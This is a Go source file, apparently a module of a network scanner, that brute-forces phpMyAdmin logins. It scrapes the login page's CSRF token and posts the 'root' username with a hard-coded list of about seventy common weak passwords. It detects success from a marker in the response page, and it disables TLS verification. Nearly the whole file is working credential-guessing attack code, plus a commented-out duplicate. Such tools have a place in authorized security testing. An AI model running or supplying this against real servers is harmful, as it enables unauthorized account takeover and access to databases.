package phpmyadmin

import (
	"KscanPro/core/ascan/common/utils/gologger"
	"bufio"
	"crypto/tls"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"regexp"
	"strings"
)

type Auth struct {
	User     string
	Password string
}

type Crack struct {
	Ip   string
	Port string
	Auth Auth
	Name string
}

type CrackResult struct {
	Crack  Crack
	Result bool
	Extra  string
	Err    error
}

var PASSWORDS = []string{" ", "123456", "admin", "admin123", "root", "5201314", "pass123", "pass@123", "password", "123123", "654321", "111111", "123", "1", "admin@123", "Admin@123", "admin123!@#", "1234qwer!@#$", "1qaz@WSX1qaz", "QAZwsxEDC", "{user}", "{user}1", "{user}12", "{user}111", "{user}123", "{user}1234", "{user}12345", "{user}123456", "{user}@123", "{user}_123", "{user}#123", "{user}@111", "{user}@2019", "P@ssw0rd!", "P@ssw0rd", "Passw0rd", "qwe123", "12345678", "test", "test123", "123qwe!@#", "123456789", "123321", "666666", "a123456.", "123456~a", "000000", "1234567890", "8888888", "!QAZ2wsx", "1qaz2wsx", "1QAZ2wsx", "1q2w3e4r", "abc123", "abc123456", "1qaz@WSX", "a11111", "a12345", "Aa1234", "Aa1234.", "Aa12345", "123456a", "123456aa", "a123456", "a123123", "Aa123123", "Aa123456", "Aa12345.", "sysadmin", "system"}

type Phpmyadmin struct {
	*Crack
}

func (p Phpmyadmin) CrackName() string {
	return "phpmyadmin"
}

func (p Phpmyadmin) CrackPort() string {
	return "8080"
}

func (p Phpmyadmin) CrackAuthUser() []string {
	return []string{"root"}
}

func (p Phpmyadmin) CrackAuthPass() []string {
	return PASSWORDS
}

func (p Phpmyadmin) IsMutex() bool {
	return true
}

func (p Phpmyadmin) CrackPortCheck() bool {
	return false
}

func (p Phpmyadmin) Exec() CrackResult {
	result := CrackResult{Crack: *p.Crack, Result: false, Err: nil}

	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	clt := http.Client{Transport: tr}
	if !strings.HasPrefix(p.Ip, "http") {
		gologger.Errorf("Invalid URL, eg: https://%s", p.Ip)
	}
	req, _ := http.NewRequest("GET", p.Ip, nil)
	req.Header.Add("User-Agent", "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1468.0 Safari/537.36")
	req.Header.Add("Connection", "close")
	req.Header.Add("Accept-Language", "zh-CN,zh;q=0.9")
	req.Header.Add("Accept-Charset", "utf-8")
	resp, err := clt.Do(req)
	if err != nil {
		log.Printf("Error making request: %v", err)
		return result
	}

	data := make([]byte, 20250)
	c := bufio.NewReader(resp.Body)
	c.Read(data)
	resp.Body.Close()
	//content, _ := ioutil.ReadAll(resp.Body)
	r := regexp.MustCompile(`(?U)name="token" value="(.*)"`)
	match := r.FindStringSubmatch(string(data))
	if match == nil {
		return result
	}
	token := strings.TrimSpace(match[1])

	jar, _ := cookiejar.New(nil)
	host, _ := url.Parse(p.Ip)
	jar.SetCookies(host, resp.Cookies())
	crackClt := http.Client{
		//CheckRedirect: func(req *http.Request, via []*http.Request) error {
		//	return http.ErrUseLastResponse
		//},
		Jar:       jar,
		Transport: tr}

	//fmt.Println(jar.Cookies(host))

	urlValues := url.Values{}
	urlValues.Add("pma_username", p.Auth.User)
	urlValues.Add("pma_password", p.Auth.Password)
	urlValues.Add("pma_lang", "zh_CN")
	urlValues.Add("server", "1")
	urlValues.Add("token", token)

	body := strings.NewReader(urlValues.Encode())
	req2, _ := http.NewRequest("POST", p.Ip, body)
	req2.Header.Add("User-Agent", "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1468.0 Safari/537.36")
	req2.Header.Add("Connection", "close")
	req2.Header.Set("Content-Type", "application/x-www-form-urlencoded")

	resp2, err := crackClt.Do(req2)
	if err != nil {
		// 处理请求错误
		log.Printf("Error making request: %v", err)
		// 应该在这里返回或处理错误
		return result
	}

	body2, err := ioutil.ReadAll(resp2.Body)
	if err != nil {
		log.Fatal(err)
	}

	// body是一个byte slice，通常我们转换成string来处理
	//fmt.Println(string(body2))

	if resp2 != nil {
		defer func() {
			// 使用 defer 调用匿名函数来处理 Close 的错误
			if err := resp2.Body.Close(); err != nil {
				// 处理关闭 resp.Body 时的错误
				log.Printf("Error closing response body: %v", err)
			}
		}()
		if strings.Contains(string(body2), "li_pma_wiki") {
			result.Result = true
		}
		//if resp2.StatusCode == 302 {
		//	result.Result = true
		//}
	} else {
		// 如果到这里，说明有严重的错误发生，resp2 应该不为 nil。
		log.Printf("Response is nil without a preceding error.")
	}

	return result
}

func run() {
	//crack("192.168.181.173", 8080)
	cr := &Crack{
		Ip:   "192.168.181.173",
		Port: "8080",
	}

	Phpmyadm := Phpmyadmin{Crack: cr}
	res := Phpmyadm.Exec()
	fmt.Println(res)

}

/*
func crack(ip string, port int) {

	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	clt := http.Client{Transport: tr}

	req, _ := http.NewRequest("GET", ip, nil)
	req.Header.Add("User-Agent", "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1468.0 Safari/537.36")
	req.Header.Add("Connection", "close")
	req.Header.Add("Accept-Language", "zh-CN,zh;q=0.9")
	req.Header.Add("Accept-Charset", "utf-8")
	resp, err := clt.Do(req)
	if err != nil {
		log.Printf("Error making request: %v", err)
		//return result
	}

	data := make([]byte, 20250)
	c := bufio.NewReader(resp.Body)
	c.Read(data)
	resp.Body.Close()
	//content, _ := ioutil.ReadAll(resp.Body)
	r := regexp.MustCompile(`(?U)name="token" value="(.*)"`)
	match := r.FindStringSubmatch(string(data))
	if match == nil {
		//return result
	}
	token := strings.TrimSpace(match[1])

	jar, _ := cookiejar.New(nil)
	host, _ := url.Parse(ip)
	jar.SetCookies(host, resp.Cookies())
	crackClt := http.Client{
		//CheckRedirect: func(req *http.Request, via []*http.Request) error {
		//	return http.ErrUseLastResponse
		//},
		Jar:       jar,
		Transport: tr}

	//fmt.Println(jar.Cookies(host))

	urlValues := url.Values{}
	urlValues.Add("pma_username", p.Auth.User)
	urlValues.Add("pma_password", p.Auth.Password)
	urlValues.Add("pma_lang", "zh_CN")
	urlValues.Add("server", "1")
	urlValues.Add("token", token)

	body := strings.NewReader(urlValues.Encode())
	req2, _ := http.NewRequest("POST", ip, body)
	req2.Header.Add("User-Agent", "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1468.0 Safari/537.36")
	req2.Header.Add("Connection", "close")
	req2.Header.Set("Content-Type", "application/x-www-form-urlencoded")

	resp2, err := crackClt.Do(req2)
	if err != nil {
		// 处理请求错误
		log.Printf("Error making request: %v", err)
		// 应该在这里返回或处理错误
		//return result
	}

	body2, err := ioutil.ReadAll(resp2.Body)
	if err != nil {
		log.Fatal(err)
	}

	// body是一个byte slice，通常我们转换成string来处理
	//fmt.Println(string(body2))

	if resp2 != nil {
		defer func() {
			// 使用 defer 调用匿名函数来处理 Close 的错误
			if err := resp2.Body.Close(); err != nil {
				// 处理关闭 resp.Body 时的错误
				log.Printf("Error closing response body: %v", err)
			}
		}()
		if strings.Contains(string(body2), "li_pma_wiki") {
			result.Result = true
		}
		//if resp2.StatusCode == 302 {
		//	result.Result = true
		//}
	} else {
		// 如果到这里，说明有严重的错误发生，resp2 应该不为 nil。
		log.Printf("Response is nil without a preceding error.")
	}

	return result
}
*/
